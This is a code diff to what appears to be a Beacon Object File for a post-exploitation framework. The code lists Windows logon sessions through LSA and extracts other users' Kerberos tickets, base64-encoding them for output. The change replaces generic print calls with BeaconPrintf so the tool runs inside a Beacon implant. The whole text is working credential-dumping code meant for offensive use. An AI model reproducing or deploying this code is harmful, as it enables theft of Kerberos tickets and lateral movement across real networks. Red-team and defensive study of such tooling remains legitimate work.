@@ -17,20 +17,20 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
     BOOL highIntegrity = IsHighIntegrity(hToken);
 //    BOOL highIntegrity = TRUE;
     if (!highIntegrity && !currentLuid) {
-        PRINT(dispatch, "[!] Not in high integrity.\n");
+        BeaconPrintf(CALLBACK_ERROR, "[!] Not in high integrity.\n");
         return;
     }
     HANDLE hLsa;
     NTSTATUS status = GetLsaHandle(hToken, highIntegrity, &hLsa);
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] GetLsaHandle %ld\n", status);
+        BeaconPrintf(CALLBACK_ERROR, "[!] GetLsaHandle %ld\n", status);
         return;
     }
     ULONG authPackage;
     LSA_STRING krbAuth = {.Buffer = "kerberos", .Length = 8, .MaximumLength = 9};
     status = SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage);
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+        BeaconPrintf(CALLBACK_ERROR, "[!] LsaLookupAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -39,7 +39,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
     status = GetLogonSessionData(luid, &sessionData);
 
     if (!NT_SUCCESS(status)) {
-        PRINT(dispatch, "[!] GetLogonSessionData: %ld", status);
+        BeaconPrintf(CALLBACK_ERROR, "[!] GetLogonSessionData: %ld", status);
         SECUR32$LsaDeregisterLogonProcess(hLsa);
         return;
     }
@@ -50,7 +50,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
 //        if (sessionData.sessionData[i] == NULL) {
 //            continue;
 //        }
-//        PrintLogonSessionData(dispatch, (*sessionData.sessionData[i]));
+//        PrintLogonSessionData(CALLBACK_ERROR, (*sessionData.sessionData[i]));
          WCHAR* sid = NULL;
          ADVAPI32$ConvertSidToStringSidW(sessionData.sessionData[i]->Sid, &sid);
          SYSTEMTIME logon_utc = ConvertToSystemtime(sessionData.sessionData[i]->LogonTime);
@@ -91,7 +91,7 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
         status = SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, &cacheRequest, sizeof(cacheRequest),
                                                       &cacheResponse, &responseSize, &protocolStatus);
         if (!NT_SUCCESS(status)) {
-            PRINT(dispatch, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
+            BeaconPrintf(CALLBACK_ERROR, "[!] LsaCallAuthenticationPackage %ld\n", ADVAPI32$LsaNtStatusToWinError(status));
             continue;
         }
         // check protocol status?
@@ -109,13 +109,13 @@ void execute_klist(HANDLE hToken, LUID luid, BOOL currentLuid, BOOL dump) {
                     ULONG ticketSize;
                     status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket, &ticketSize);
                     if (!NT_SUCCESS(status)) {
-                        PRINT(dispatch, "[!] Could not extract the ticket: %ld\n", status);
+                        BeaconPrintf(CALLBACK_ERROR, "[!] Could not extract the ticket: %ld\n", status);
                     } else {
                         if (ticketSize > 0) {
                             int len = Base64encode_len(ticketSize);
                             char* encoded = (char*)MSVCRT$calloc(len, sizeof(char));
                             if (encoded == NULL) {
-                                PRINT(dispatch, "[!] Base64 - could not allocate memory.\n");
+                                BeaconPrintf(CALLBACK_ERROR, "[!] Base64 - could not allocate memory.\n");
                                 continue;
                             }
                             Base64encode(encoded, ticket, ticketSize);
@@ -245,7 +245,7 @@ void PrintTicketInfoDump(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
 	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
 	"\tRenew Time      : %d/%d/%d %d:%d:%d (UTC)\n"
 	"\tEncryption Type : %li\n"
-	"\tTicket          : %s\n",
+	"\tTicket          : \n%s\n",
 	GetNarrowStringFromUnicode(cacheInfo.ClientName), GetNarrowStringFromUnicode(cacheInfo.ClientRealm), 
 	GetNarrowStringFromUnicode(cacheInfo.ServerName), GetNarrowStringFromUnicode(cacheInfo.ServerRealm),
 	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
